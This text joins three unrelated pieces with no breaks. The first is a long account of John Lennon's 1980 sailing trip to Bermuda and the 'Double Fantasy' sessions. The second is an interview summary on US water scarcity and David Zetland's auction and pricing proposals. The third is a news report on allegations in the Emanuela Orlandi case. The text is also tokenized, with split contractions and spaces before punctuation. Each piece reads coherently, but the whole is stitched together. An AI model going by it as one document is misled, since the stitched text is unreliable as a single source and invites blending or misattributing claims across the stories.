Splashing out on a 14 - foot sailboat from Coneys Marine , a family - run enterprise in nearby Huntington Bay , John recruited 25 - year - old Tyler Coneys to show him how to handle his new toy , named Isis by the former Beatle after the Egyptian fertility goddess .
After work each evening Tyler would swing by the Canon Hill mansion to show John the ropes , and soon Lennon and his young bosun were at ease with each other ’s company , taking the sailboat around the bay and shooting the breeze , chatting openly about music , relationships , guy - talk .
Learning what he could from the young but experienced sailor , John supplemented these personal tutorials by consuming all the maritime manuals he could lay his hands on .
But John ’s ambition lay far beyond the small sailboat that he was soon single - handedly piloting around the bay .
“ He was a doer – the kind of guy who liked to do things , ” recalls Tyler Coneys .
“ He was just a real guy . ”
With his heart set on journeying onto the high seas , John was ready for a big adventure , and he set Tyler the challenge of turning this pipedream into a reality .
“ It all came about suddenly , but he ’d had it in his mind for a long time , ” says Tyler .
“ It ’s a common thing , is n’t it ?
You think life is passing you by and when you ’re 40 all of a sudden you get that sports car or a motorcycle or go on some adventure .
You say ‘ I ’ve got to do something , get off the couch ! ’ ”
Yoko initially insisted that her psychics scour the sailing magazines to perform ‘ readings ’ in their search for a suitable boat , but soon she relented and allowed Tyler to secure the services of Captain Hank Halsted and the Megan Jaye , a 43 - foot Hinckley Centreboard Sloop out of Newport , Rhode Island .
Yoko maintained the right to decide upon a destination for John ’s little summer adventure and consulted her Japanese ‘ directionalist ’ , Takashi Yoshikawa .
The only way for John to escape the clouds that were casting a shadow over his life , to re-find his quiescence and his creativity , his centre and his balance , was to travel south - east towards Bermuda .
Only a matter of weeks previous he had been dispatched alone to Cape Town to similarly escape the gathering clouds .
Now , after years fearing to venture out in case Mercury was in retrograde , John was now literally casting himself adrift in the company of people he barely knew .
“ Yoko said he could do it because the stars were right , ” says Tyler , so on the morning of June 4 , 1980 , John Lennon , Tyler and his cousins , Ellen and Kevin Coneys departed Farmingdale Airport in a Cosmopolitan Airways twin-engine Cessna .
“ See you in paradise , ” shouted John as he boarded the plane .
Waiting in Newport was the Megan Jaye and John Lennon ’s date with the unknown .
Cap’n
Hank had n’t been told the identity of his principle passenger , and to be honest , he did n’t really recognize Lennon for the best part of a day as the crew prepared to depart , but eventually the clues began to mount up until the point , just as they were leaving the dock , when Hank turned to his charter agent and said , “ What would you say if I told you that I think I have John Lennon on my boat ” .
“ Just what I always say to you , ” was the reply , “ that you ’re full of shit ! ”
The boat pulled out of Newport into a high - pressure system with the wind coming out of the North West .
The weather was clearing and John was excited .
“ This is good , ” he said , “ we ’re sailing south east . ”
“ It was an important direction for him in the context of his psychic healing , ” explains Hank .
“ He hung on Yoko ’s every word in that department .
He had recently flown to Cape Town to literally get out from under the clouds – and he pointed to this cloud that we were sailing out from under , saying ‘ boy , this is pretty cool , this feels right ’. ”
The adventure was beginning in an idyllic fashion .
“ It was fantastic , ” recalls Tyler .
“ It was sunny , with perfect winds , and there were dolphins swimming off the bow . ”
John was content with his role in charge of the ship ’s galley and with the journey scheduled for six days , he planned to use the vacation for a cleansing fast .
With over 700 miles of clear blue water to cover , there was also plenty of time to enjoy the weather and listen to the radio , as each watch took their turn at the helm .
John and Tyler formed one watch , Tyler ’s cousins another , and Cap’n Hank took the dog watch – the lone spell at the helm reserved for the odd man out .
Tyler noted with interest how Lennon ’s ears would prick up when old sparring partner Paul McCartney would hit the airwaves with chirpy ditties like ‘ Silly Love Songs ’ and current single ‘ Coming Up ’ , then heading towards the very top of the US charts .
“ John was hearing those songs on the radio a lot , ” says Tyler .
“ Think about it .
It was like ‘ I Want To Hold Your Hand ’ or ‘ She Loves You ’ all over again .
It was like the same lyrics – and here Paul is , with the Number One hit again .
John was saying ‘ I could do that ’.
I would n’t call it a rivalry , but it made him think ‘ Jesus , what am I doing sitting here , I should get up and do something , because it ’s not that hard ’. ” John and Cap’n Hank hit it off immediately .
Closer in age , they had much more in common with each other than with their younger crewmates .
Back in Colorado in the ’60s
Hank had experimented with the same kind of psychedelics and had run a drug clinic , while in the early ’ 70s he had dabbled in concert promotion , staging a festival at Erie Raceway that featured The Allman Brothers and Big Brother and the Holding Company .
“ John and I pretty rapidly discovered that we ’d been around a lot of the same corners in all kinds of things , ” says Hank of the drugs and rock ’n’roll .
“ He simply went around his corners on a much grander scale than I did . ”
With things peaceful aboard ship , the two would sit and chat , Hank working his way through a pack of Camels .
There were a thousand questions that Hank wanted to ask and Lennon was never slow in responding .
They would talk about many things and Hank would push Lennon on success , fame and John ’s self - inflicted retirement from rock ’n’roll .
“ You just affected 50 million people to the positive there , big boy , what are you going to do to follow that up ? ” begged Hank .
John thought about it for a second , drawing on a Gitane , and looked back .
“ I ’m going to raise my boy Sean , ” he said .
Not long into the trip the adventure would take a turn for the unexpected .
“ That ’s when we had the big storm ! ” recalls Tyler .
“ It got all grey very suddenly .
A group of military ships came by and went around us in a circle and then left , making us wonder what was going on .
We were already too far out to go back – once you ’re out in the ocean , you ca n’t turn back anyway .
Then it got real bad .
It was the worst storm I was ever in , 65 mph winds and 20 foot seas – you can get BIGGER waves , but that ’s pretty bad in a 43 - foot boat . ”
With the storm showing no signs of abating , one by one John ’s shipmates fell victim to the constant rolling of the boat and were felled by seasickness .
Even Tyler , an experienced sailor , eventually succumbed – leaving Cap’n Hank at the wheel and John in the galley .
“ He was unaffected by it , ” remembers Tyler .
“ He told me later that because he had been a heroin addict for a short time , and that as going through withdrawal is the hardest thing you would ever go through , being out here was nothing compared to that . ”
“ That ’s what smack does to you , ” concurs Hank .
“ He ’d been through drugs for so long – you learn to control throwing up . ”
With gales blowing at 40 knots and waves relentlessly pounding the deck , the ship was taking somewhat of a battering .
“ We have what we call a dodger , a stainless steel cover for the hatch , ” says Cap’n Hank .
“ It ’s the only time I ’ve had one of those absolutely flattened by a wave .
It was a pretty serious storm .
This was a situation where you had to know what you were doing . ”
For reassurance , Lennon would scrutinize the Captain ’s face , looking for any signs of worry or fear .
“ Had he sensed any nervousness on my part , he would n’t have had such a good time .
He really placed a tremendous amount of faith in me . ”
After nearly two days at the wheel , tiredness finally got the better of the Captain and responsibility for piloting the vessel fell to the ship ’s cook .
Pointing to John , and then to the ship ’s wheel , the Captain said , “ I ’m going to need your help here , big boy . ”
John looked back in disbelief .
“ Hey Hank , I ’ve just got these little guitar - playing muscles here . ”
The Captain fixed him with a stare .
“ That ai n’t the kind of strength I ’m looking for – just come back and drive this puppy and I ’ll tell you what to do . ”
Sitting with Lennon for the first hour , Cap’n
Hank taught his shipmate some of the fundamentals that he would need to weather the storm .
“ I let him know that you do n’t jibe , you do n’t let the wind get across the back - end of the boat because that would cause some other violent changes and we do n’t want to deal with that .
And I gave him his course .
He picked it up fast .
His intuition about this kind of stuff was remarkable . ”
Railing against the storm , Lennon , invoked the name of his father in the face of the gale , hanging on to the wheel for dear life .
“ At first I was terrified but Cap’n Hank was at my side , so I felt relatively safe , ‘ cause I knew he would n’t let me do anything stupid , ” Lennon would later tell his personal assistant Fred Seaman .
“ Once I accepted the reality of the situation , something greater than me took over and all of a sudden I lost my fear .
I actually began to enjoy the experience , and I began to sing and shout old sea shanties in the face of the storm , feeling total exhilaration .
I had the time of my life . ”
“ That might have been a tremendously cathartic moment for him .
When I came back on deck several hours later , this was a man who was just enraptured – it was stimulus worthy of this stimulus - addict of a guy , ” says Hank .
Tyler could also sense the exhilaration : “ Besides having his children I think it was one of the happiest moments in his life . ”
The storm lasted for the best part of the six - day journey and John had met every challenge thrown at him .
He even helped Cap’n Hank make on - the - spot repairs after damage to the mainsail resulted in the Megan Jaye coasting without sails for a day .
“ I would venture to say that he discovered the tremendously strong man who had always been there , ” concludes Hank .
“ It was a cool thing to watch , a metamorphosis that occurred . ”
The John Lennon who arrived in Bermuda was indeed a very different man .
When his personal assistant Fred Seaman caught up a few days later he was immediately struck by the transformation .
“ The moment I saw John I noticed a difference in him .
He had lost the pallor he had acquired over five years at the Dakota .
I realized that the whole time I had known him he had always looked like a man suffering from a degenerative illness .
Now he was tanned and exuded health and vitality . ”
John was quite taken with Bermuda .
Still a Crown protectorate , he revelled in the colonial Britishness of the place – it reminded him of the England of his youth , the country he had n’t seen for nearly a decade .
The boat journey having restored confidence in his own powers , here in the Bermudan sunshine , in a makeshift home studio at his rented villa on the outskirts of Hamilton , John Lennon picked up a guitar , rolled his sleeves up , and got back to some serious work .
“ I was so centred after the experience at sea that I was tuned in to the cosmos – and all these songs came ! ” he said later .
The first song composed on the island was directly inspired by the experiences on the Megan Jaye .
John was looking for a hook on which he could hang all the thoughts and ideas about the frailty of life that had been buzzing around his head since the storm .
Listening to Bob Marley ’s ‘ Hallelujah Time ’ , he grabbed at the line he needed : “ We got to keep living , living on borrowed time ” .
“ That ’s the phrase I ’ve been looking for .
I ’ve had this song in my head for ages , ” said John .
“ I ’ll write the words around the theme of living on borrowed time , which is exactly what I ’m doing … what we ’re all doing , even though most of us do n’t like to face it . ”
Within a few hours , ‘ Living On Borrowed Time ’ was already roughed out .
John was a man with a creative purpose once more .
Although he ’d never really stopped composing through his Dakota days , he had lacked the motivation to complete anything he would be happy to put his name to .
He had brought many of these unfinished fragments with him on cassette , and now , with his songwriting urges restored , he could plunder this treasure trove of ideas whenever the need arose .
Like several of these new hybrid creations , ‘ Watching The Wheels ’ had its roots in older melodies , or lyrics that had been passed from song to song , then refined aboard the Megan Jaye in philosophical conversation with Cap’n Hank about the meaning of success .
Others had a more obvious Bermudan genesis : ‘ Stepping Out ’ was inspired by a petulant crawl around the nightclubs of Hamilton after Yoko had failed to commit to a visit , while ‘ I ’m Losing You ’ resulted from John ’s inability to get his wife on the phone at a time when he feared his relationship might be slipping away from him , turning the unfinished ‘ Stranger ’s Room ’ into a savage rocker that he would ultimately dub “ ‘ Cold Turkey ’ rides again ” .
According to Tyler , the Lennon who set - sail for Bermuda had shown little interest in re-launching his musical career , but with so much of the inspiration for the new material spinning out of a love for his wife and child , it seemed that his near - to - death experience had helped focus John ’s priorities in life .
“ Yoko was really good for him and he really loved her , ” says Tyler .
“ He was trying to keep everything burning with ‘ Double Fantasy ’ and I think it worked very well . ”
The demoing process was simple but effective .
Using a drum machine , a guitar , and two boom boxes to allow him the luxury of very primitive double tracking , John would record a backing track on one cassette and sing along into another , sometimes with Fred Seaman tapping out percussion .
Bit by bit , John Lennon was getting ready to go back out into the world .
The clouds had lifted .
Producer Jack Douglas was not surprised when he got a call from Yoko Ono .
He had worked with John many times in the early ’ 70s after first meeting him as a young engineer on the New York end of the ‘ Imagine ’ album sessions .
He had worked on several of Yoko ’s albums and had subsequently become a Producer in his own right , with major successes under his belt care of Aerosmith and Cheap Trick .
When Lennon had stumbled upon him in a restaurant earlier that year , he congratulated Douglas and admitted to having kept an interested eye on the young producer ’s career .
John quizzed him about current production trends and studio technology , but Douglas thought no more of the chance meeting until Yoko ’s call , when she announced she was dispatching a seaplane to pick him up from a pier on the East River to take him to their house in Cold Harbour Bay .
On his arrival she handed him a package marked , ‘ For Jack ’s Eyes Only ’ .
“ Yoko told me that John was going back into the studio to do an album and he wanted me to produce it , and that I could n’t say anything to anyone , ” says Douglas .
The package contained a letter from John , who was in Bermuda , and two cassettes of demos .
A few minutes later John was on the phone , talking Jack through the Top Secret plans .
“ He told me to put together a band of his contemporaries so that if he made a reference to something from the ’50s or the ’60s they would know what he was talking about , ” recalls Douglas .
Lennon ’s only stipulation was that they should be top - notch professionals – he was now totally focussed and did n’t want the distraction of his former studio sidemen and drinking cronies .
For Lennon this session was too important to take risks .
Before Douglas could return to New York , Yoko handed him a huge stack of reel - to - reel tapes , containing dozens of her own compositions .
“ John does n’t know it yet , ” she confided , “ but I ’m going to have a couple of songs on this album . ”
On July 29 Lennon left Bermuda and two days later he was sketching out plans with Jack Douglas .
Although the exact form of the album , and it ’s content , had yet to be decided , Lennon already had it ’s title – Double Fantasy , the name of a freesia that he had chanced upon while taking Sean on a sightseeing trip around Bermuda ’s botanical gardens .
Lennon was keen to work quickly in the studio and to that end , Douglas had been rehearsing the musicians in advance .
“ My immediate impressions were that I was going to have a hard time making it better than the demos because there was such intimacy in the demos , ” recalls Douglas .
“ They were so much fun to listen to . ”
On Monday August 4 , 1980 , dressed in a black embroidered cowboy shirt and brimmed hat , briefcase in hand , John Lennon headed for the Hit Factory on West 48th Street for the first day of recording .
“ He was in charge from that very first moment , ” recalls session drummer , Andy Newmark .
“ There was not a lapse of ten minutes between when he came in and when things got rolling . ”
The band would run through a song a few times to get comfortable before going for a take .
John sat close to Jack Douglas and was n’t slow to pull the musicians up if it was n’t what he wanted .
“ John was so blunt , ” remembers Newmark .
“ He did n’t tiptoe around with the way he spoke to people but it was n’t offensive or nasty – it worked .
His usual comment to me was ‘ Andy , forget all the fancy shit , I want to get this in three takes , play like Ringo ’ .
All he had to say was ‘ play like Ringo ’ and it completely focused me on how to approach making his record . ”
John was now a man at ease with his past as ‘ Beatle John ’ .
Although the 115 - hours of Jack Douglas ’s covertly taped studio banter reveal him snapping at Yoko when she joked that he was sounding like a Beatle – “ an ex-Beatle you cunt ! ” – he was happy enough to encourage his musicians to regard the beautifully crafted ‘ Woman ’ as an “ early Motown / Beatles circa ’ 64 ballad ” .
Indeed , he would reminisce daily about “ the B ’s ” in the studio , never leaving his audience in any doubt that they had , in fact , been HIS band !
Very early in the sessions , Jack Douglas had persuaded John to experiment with a couple of tracks – he wanted to bring in Cheap Trick to add a bit of edge to Lennon ’s ‘ I ’m Losing You ’ and Yoko ’s ‘ I ’m Moving On ’ .
Douglas had produced Cheap Trick and had been the man responsible for signing them to Epic Records .
He rang up George Martin , who was currently working with the band in Montserrat , and joked : “ You ’ve got my band and I ’ve got one of yours , can I borrow my band for a few tracks ? ”
Cheap Trick drummer Bun E Carlos arrived at The Hit Factory with guitarist Rick Nielsen , who had been given special dispensation to appear on the session by his wife , who had given birth to their third son earlier that morning .
“ I do n’t think I would have missed being at the hospital for anyone else except for John Lennon , ” says Nielsen .
The Cheap Trick pair joined regular session bassist Tony Levin and George Smalls on keyboards for the recording of “ I ’m Losing You ” , Lennon and Nielsen trading guitar licks as the band furiously jammed out the song until it had the form they wanted .
“ It really rocked , ” says Douglas .
“ It was very different from the kind of thing you get from straight - ahead studio musicians and John was thrilled . ”
With the basic track nailed in just three or four live takes , the musicians sat in the control booth watching Nielsen doubling his guitar solo .
Lennon turned to Bun E and confided : “ Man , I wish I ’d had him on ‘ Cold Turkey ’ – we had Clapton on that and he froze up and could only play this one riff . ”
John may have been pleased with the track , but Yoko was less happy , and the recording was shelved .
According to Jack Douglas there was nothing that he could do or say to persuade her that this was n’t some unknown band wishing to trade on the Lennon name .
“ And of course John did n’t argue with Yoko . ”
As for Cheap Trick , they were unaware of any problems in the studio .
“ Yoko was great to us when we were there – and she said great stuff about us when the track was finally released 17 years later , ” says Nielsen .
“ We were thrilled that we got to play on it and when it came out all those years later I felt kind of vindicated as
I always thought our version was better than the one on the album . ”
The Cheap Trick take of the song remained unreleased until its appearance on the Lennon Anthology box - set in 1998 , when Yoko reunited Nielsen , Carlos and Levin to make a video for the track .
Within a couple of days of the original recording session , however , the house band were instructed to re-play the song , even replicating Rick Nielsen ’s guitar licks , much to his annoyance all these years later .
“ We played the Cheap Trick track into the earphones of the musicians and they played along with it , to kind of get the feel of the original , ” says Douglas .
“ I remember hearing it and thinking , ‘ Wow , that sounds so amazing ’ , ” recalls drummer Andy Newmark .
“ They played it for us a day or two after they had done it , but for whatever reason we cut the tune again . ”
Another guest appearance that actually made it onto the album was more bizarre in its origins .
Jack Douglas and engineer Lee DeCarlo had come across a street musician playing Hammer Dulcimer in Greenwich Village , enquiring whether he wanted to take part in a recording session .
Arranger Tony Davilio remembers the bemusement on the face of the musician as he was preparing to make his contribution to ‘ Watching The Wheels ’ .
“ He was a really hippie and he was sitting down with his Dulcimer in a yoga position , with his legs folded under him , ” recalls Davilio .
“ Jack and John pretty much told him where they wanted him to play – it went well , but at one point he was staring into the control room .
He points at John and says ‘ What ’s your name ? ’
‘ I ’m John , ’ comes the reply .
And he goes ‘ Hi John ’ .
I really do n’t think he knew who John was . ”
In just under two weeks all the basic backing tracks were recorded , including all of the songs that would later form Lennon ’s half of the ‘ Milk And Honey ’ collection .
The musicians were then called in when required for overdubs , followed by vocals – which brought their own problems .
“ John stayed away from what should be done with his vocals because he had no objectivity , ” says Douglas .
“ He thought he did n’t have much of a voice left , so he insisted on double - tracking everything .
It was only after he heard his performance on ‘ Watching The Wheels ’ that he told Yoko she could announce this record was being made .
He was suddenly very happy and realized he could do it . ”
Yoko ’s vocals tended to take a little longer , Douglas piecing them together bit by bit .
Having worked on several of her solo albums , he knew how to get the best from her .
“ She could be a handful for sure , but there were certain psychological things you had to do to work with her . ”
Creating a comfortable environment for her to work in , and employing mic techniques that would suit her style , he would concentrate on achieving several complete performances and after the end of each day ’s session he would stay late to ‘ comp ’ together the best parts of each take .
Everybody on the album , from John downwards , was totally focussed on making this a tremendous record – and that meant Yoko ’s tracks too .
To get the best out of both of his clients Jack Douglas had already worked out that it was best to keep them apart , not because there was any lack of love between the two principles – everyone who worked on the project came away from the sessions with the distinct impression that here was a couple totally devoted to each other – but because they worked in completely different ways .
“ I could n’t have the two of them in the studio at the same time , it just did n’t work , ” says Douglas .
“ John would get really frustrated with Yoko if she was singing flat , and she did n’t really want his interference in what she was doing , so we would work on Yoko ’s songs in the afternoon and then John would come at 7 pm . ”
With enough material in the can for two albums , John , Jack and Yoko each sat down to prepare a potential running order .
By now John was completely focussed on making the album an equal showcase for both their talents , but when Jack and John turned in their fairly similar tracklistings , Yoko objected to the way that both had assumed her songs would be on one side of the album and John ’s on the other .
“ She got really mad at us and said ‘ no way , because no - one will ever flip the record over – if you want to listen to a John song , you ’ve got to listen to a Yoko song , that ’s the way it has to be ’. ”
As the album progressed , one very important thing was still missing – the world ’s most famous couple were still to sign a record deal .
John had allowed his recording contract with EMI to lapse early in 1976 and had not sought to renew it while concentrating on life as a househusband .
Now back in the centre of the creative process , the pair shied from the possibility of record label interference and decided to finance the ‘ Double Fantasy ’ sessions themselves , with the intention of striking a deal when John was happy with the direction of the album .
Yoko assumed responsibility for securing the contract .
John was hard at work in the studio and distanced himself from the deal - making process , refusing to talk to anyone who was n’t prepared to negotiate with his wife .
Privately he had set himself a target of matching the reported $ 22.5 m deal that Paul McCartney had recently signed , and while Bruce Lundvall , President of Columbia Records , was willing to match the deal that he had struck with McCartney , like so many other suitors , he baulked when informed by Yoko that her songs would form half of any album .
With every label determined to clinch Lennon ’s signature , and none of them allowed to bypass Yoko , some tried more extreme measures .
Legendary Atlantic Records boss Ahmet Ertegun even managed to penetrate the sixth floor security at the Hit Factory before being asked to leave .
David Geffen watched with interest .
The one - time founder of Asylum Records had recently formed a new label , Geffen Records , and rather than shying away from Yoko ’s involvement in the album , he cannily insisted that if he managed to get them , he would be signing two great artists instead of one .
After Yoko had analysed his personal information – date of birth , phone number , address , and concluded that he had “ good numbers ” – they proceeded to discuss a potential deal , Yoko asking him to throw out figures .
Geffen had learnt well from a bad business mistake made early in his career and rather than pitch in with a ludicrously high opening offer , he simply asked Yoko to name her price .
She informed him they were looking for at least a million dollars per album .
As he had paid a similar amount to clinch the signatures of both Donna Summer and Elton John , he did not hesitate to grab at this bargain .
“ We ’ve got a deal , ” he said , having not even asked to hear the music .
With work on the album ongoing , and less than a week after agreeing the deal with Geffen , the couple spent September 26 mixing the first single for release .
The chosen A - side was the aptly titled ‘( Just Like ) Starting Over ’ , Lennon ’s affectionate nod to his rock ’n ’roll past .
Although its roots were in unfinished older compositions like ‘ Do n’t Be Crazy ’ and ‘ My Life ’ , it was one of the last songs to be completed in time for the sessions .
“ We did n’t hear it until the last day of rehearsal , ” recalls Douglas .
John pulled him aside and said : “ I was listening to some Roy Orbison and I thought this would be kind of like a Roy thing . ”
He played ‘( Just Like ) Starting Over ’ on the piano and Douglas knew straight away that here was John ’s opening gambit .
To hit the necessary schedules the single had to be completed long before the album , with work progressing through night and into the next day .
That afternoon , Fred Seaman was dispatched to the Dakota to fish out a Tibetan wishing bell for the song ’s opening flourish – it would be the final touch added to the recording .
The race to finish the mix by 7 pm – because Yoko had pointed to a “ significant moon change ” – was achieved with just seconds to spare , and backed by Yoko ’s ‘ Kiss Kiss Kiss ’ , on October 23 , 1980 , ‘( Just Like ) Starting Over ’ became John Lennon ’s first new release in five years .
The final mixes of ‘ Double Fantasy ’ had been finished just days earlier .
An odyssey that had started on the high seas of the Atlantic was now complete – if there had been rocky moments for John and Yoko on the road to ‘ Double Fantasy ’ , the album proved a Valentine capable of fanning the flames of their love .
And for John , there was no doubting what had inspired this renewed spirit of creativity .
“ I always talked about sailing but my excuse was that I 'd never had lessons , ” he said .
“ Yoko 's attitude was ' Put up or shut up ' .
So she sent me on this trip and I went .
She sent me specifically to open up my creativity , though she did n't tell me that . ”
John had planned to take a break in Bermuda after the recording was over , but so excited was he about a plan he had hatched to make his wife a star in her own right , he soon returned to studio to work on Yoko ’s ‘ Walking On Thin Ice ’ .
“ The last time I saw John he had this incredible smile on his face , ” recalls Jack Douglas .
“ It was the evening we finished ‘ Walking On Thin Ice ’ .
He was just thrilled , and so was Yoko , because we all knew we had accomplished what John set out to do with that track .
I walked him to the elevator and said goodnight .
About 40 minutes later my girlfriend came to the studio , all white .
‘ It ’s just been on the radio , ’ she said .
‘ John was shot ’ . ”
For the first time in years Lennon had been making big plans .
He had let it be known that he would be calling the ‘ Double Fantasy ’ musicians back into the studio in mid December to complete unused recordings like ‘ Living On Borrowed Time ’ and ‘ I ’m Stepping Out ’ for a second album , with a world tour to follow .
But that was n’t to be .
Lennon had lived his life demanding truth , but on ‘ Double Fantasy ’ he had stumbled across the most brutal truth of all – that life is what happens to you when you ’re busy making other plans .

We ’re in a water crisis .
Before I talked to economist and creator of Aguanomics David Zetland , those two words–water + crisis — made me scratch my head .
I ’ve visited developing countries with water problems in the past .
In many of those places , water trucks refill tanks located on the tops of buildings , and consumers have to haul their daily dihydrogen monoxide home in buckets .
Here in the States , however , there ’s plenty of water flowing from our taps .
All the time .
According to Zetland , that illusion of plenty–endless water flowing from our taps–is part of the problem .
Business Pundit interviewed Zetland , who was recently been featured in Forbes and on Fox Business News , to get a primer on the water crisis — and how to solve it .
Below are notes from the interview .
( Ed. : I organized these by category rather by Q&A .
This is basically a transcription )
WHAT ’S THE PROBLEM ?
Our demand for water often exceeds supply .
When that happens ( as in Las Vegas and Atlanta now ) , a small imbalance can inflate into a crisis .
What do we mean by crisis ?
If a watershed is storing less than a year ’s worth of water , groundwater is falling fast , and rain is n’t coming , it ’s a crisis .
In situations like that , people MUST change their consumption behavior if they want to be able to live there in 2 - 3 years .
Las Vegas has been on the edge of crisis for years .
Although the city is one of the most efficient water users in the country , its major water source is close to depletion .
Vegas is trying to get more water by building an aqueduct to bring groundwater from rural Nevada , but that solution is neither sustainable ( Vegas will be mining the water ) nor ecological ( the exporting area will lose its water supply ) .
Demand from metropolitan Atlanta is also causing trouble for neighboring states in the Southeast that claim Atlanta is taking more water than it should .
Southern California gets its water from the Colorado River and northern California .
The region is in a bad drought .
If it does n’t rain this winter , red lights are going to be flashing even brighter .
Most of the Colorado River Basin is in a drought , and it ’s not getting better .
Colorado ’s Front Range , where Denver is located , does n’t have much water .
Denver and other areas import water from the other side of the Continental Divide using a tunnel bored through the Rockies .
Water exporting areas are worried that their future is flowing into that tunnel .
In all of these areas , it ’s necessary to make changes in the way water is managed .
If we do n’t make changes , people and businesses will suffer from less - reliable water supplies ( rationing ! ) , farmers ’ water will be seized ( emergency ! ) , and the environment will be screwed ( dry riverbeds ! ) .
HOW DID THIS HAPPEN ?
Back in the old days , there was enough water for everyone .
Cheap water was ( and is still ) used as a development tool .
Landowners love cheap water :
It makes worthless land valuable .
Governments love it because development brings tax revenues and power .
The first programs gave water to farmers who settled on the frontier .
As frontier areas developed , the demand for water grew , but there was n’t enough .
The government got more ambitious – developing water for agriculture through megalomaniacal engineering projects .
People wanted to reshape the West , make flowers bloom in the desert .
( ED : For example , the Central Valley Project ( CVP ) delivers water to California ’s Central Valley , a semi-arid desert .
It provides half the water for the agricultural industry there , which accounts for about 2 - 3 % of gross state product .
It ’s also heavily subsidized . )
Urban demand grew at the same time around this “ enough water for everyone mentality . ”
For example , the Southwest is now home to millions of people who depend on imported water ( and air conditioning ! ) .
You can find similar examples of unsustainable living in the Middle East , tourist resorts on islands , and , most recently , in China .
These crises result when too many people and farms exist in areas not naturally capable of supporting them .
After many decades of “ hydro - growth , ” people are unprepared to change their lifestyles .
Meanwhile , supply becomes increasingly stretched –until it snaps .
WHO OWNS WATER ?
Although “ The People ” own the water , farmers own most of the rights to use that water .
In the US , agriculture consumes about 75 % of the developed water supply , with the rest going to urban areas .
Farmers ’ water rights are strong , but they can be of limited use .
Although some farmers might prefer to “ farm water ” ( sell water to cities ) , they are often prevented from doing so .
Some laws state , for example , that a farmer who does not use his water will lose his rights .
It ’s in situations like this that we see farmers flooding the desert to grow grass while municipal water providers are fighting to get water for their customers .
Even worse , farmers with vague rights may face shortages or rationing .
Shortages can result when too many farmers tap the same aquifer ( too many straws in the glass ) ; rationing may result when imported supplies are cut .
Farmers who ca n’t get water at any price may have to cut down an avocado orchard to keep remaining trees from dying of drought .
THE SOLUTION : MORE MARKETS AND HIGHER PRICES
Although agricultural and urban water supplies are managed in different ways , they come from the same sources .
When these sources are under stress , water supplies need to be managed in different , but interdependent ways .
Zetland proposes that wholesale auctions be used to allocate water among urban , agricultural and environmental uses .
After that allocation , he proposes that urban areas use “ conservation pricing ” to limit demand to available supply .
Agricultural users , on the other hand , have the capacity to allocate their water supplies through a second set of auctions .
( Environmental water presently just flows down the river … )
Auctions
Note that wholesale auctions would only sell sustainable quantities of water , so that ( minimal ) environmental flows and aquifers are maintained .
( Environmental interests may want to buy more water for “ restoration ” or “ augmentation ” at auction . )
By a sustainable yield , we mean that there ’s no water shortage if what goes out equals what comes in .
If you sink a well and take water out at the same rate it comes back to surface , that ’s sustainable .
If you take water out faster than that , you ’re mining water , which means that your renewable resource disappears and the land is uninhabitable .
For more on wholesale auctions , see Zetland ’s site .
Why auctions ?
Because they are the easiest way to ensure that water reaches its highest and best use .
Consider these facts :
Farmers pay $ 20 per acre / foot of water ( that ’s an acre of land covered a foot deep in water ) .
A single person consumes 1/ 8 of an acre / foot per year .
A single person pays $ 1000 per acre / foot of water .
Farmers own 75 % of the nation ’s water supply .
Moving water from agriculture would increase water supplies for urban dwellers , at a market - appropriate price .
Some farmers , for example , can make more money selling water than farming low - value crops like alfalfa , hay , or cotton .
The water they own would be put on the market , and consumers , other farmers , industries , businesses , etc. would compete for that water in an auction .
Of course , a bidding war for water is likely to increase prices – and higher prices will signal that water should be treated as a precious resource .
Conservation Pricing
From Zetland ’s Forbes editorial :
I propose a system where every person gets the first 75 gallons , or 1.5 bathtubs , per day for free but pays $ 5.60 for each 75 gallons after that .
Under my system , the monthly bill for the average household of three would come to $ 95 .
Most families will respond to higher prices by using less , so their bill will not be three times today ’s low price .
( Those who use less than their “ lifeline ” allocation will pay nothing at all . )
As higher prices reduce the quantity demanded ( a la $ 4 / gallon gas ) , water supplies will stretch farther .
Overall
If we had a reasonable price on water , we could have a sustainable water supply everywhere , forever .
People will have 100 % reliability IF they are willing to pay .
If businesses want reliable water , they pay .
If poor people want to use water for more than drinking and sanitation , they pay .
If a guy wants to irrigate his golf course , he pays A LOT .
The food supply would shift to higher value crops ( less alfalfa and more broccoli ) .
Food prices would go up , but they would reflect the true cost of growing food , not the subsidized cost from unsustainable practices .
CONCLUSION
Zetland is working with farmers to test auctions for reallocation of water within irrigation districts .
He is also pushing for urban price reform ( he says the tide is going in that direction ) .
One driver for urban price reform is political necessity : Cities wo n’t be able to approach farmers until they are efficiently managing their own supplies .
The general population has mixed reactions to his proposals .
Although some think that water should be subjected to even stronger market forces , the majority find it hard to put a price on water .
“ Water is a very emotional subject for people , ” he says .
“ They do n’t want to use markets for allocating water , but if they do n’t there wo n’t be any . ”

The unsolved case of a 15 - year - old girl who went missing in Rome 25 years ago has been dramatically reopened .
A woman has told police the girl was kidnapped by a criminal gang on the orders of Archbishop Paul Marcinkus , the disgraced former head of the Vatican 's bank who was linked to the death of the Italian banker Roberto Calvi .
The disappearance in June 1983 of Emanuela Orlandi , the daughter of a Vatican employee , has previously been linked by criminal informants to the Rome - based Banda della Magliana gang .
But new details supplied by Sabrina Minardi , former girlfriend to the gang 's boss , Enrico De Pedis , now ties in the Holy See official .
Minardi has claimed De Pedis snatched the girl on the orders of Marcinkus " to send a message to someone above them " as part of a " power game " , La Repubblica newspaper reported yesterday , quoting her testimony .
After being held then killed , Orlandi 's body was put in a sack and hidden in a cement mixer on the outskirts of Rome , Minardi said .
American - born Marcinkus died in 2006 aged 84 , taking to the grave the truth about his suspected links to the collapse of Italy 's Banco Ambrosiano in 1982 and his association with Michele Sindona , a convicted fraudster linked to the mafia who died in prison in Italy in 1986 after drinking coffee laced with cyanide .
As head of the Vatican bank , Marcinkus oversaw the Holy See 's stake in Banco Ambrosiano and knew the bank 's chairman , Roberto Calvi , who was found hanged from Blackfriars bridge in 1982 .
Marcinkus was protected by Vatican diplomatic immunity from questioning about his role in the bank 's collapse although the Vatican paid out $ 250 m to creditors .
Minardi has told investigators that De Pedis carried out Marcinkus 's order to kidnap Orlandi in return for the archbishop 's help in investing cash overseas from the proceeds of other kidnappings undertaken by the Rome gang .
That cash was delivered to the archbishop 's apartment in Louis Vuitton bags , Minardi said , adding that she knew the apartment because she would take girls there on Marcinkus 's orders .
Members of Orlandi's family , who have plastered Rome this week with missing posters to commemorate the anniversary of Emanuela 's disappearance , said they were sceptical of the claims made by Minardi , who has been treated for drug abuse .
Investigators remained cautious but are impressed by the accuracy of some details , La Repubblica said .
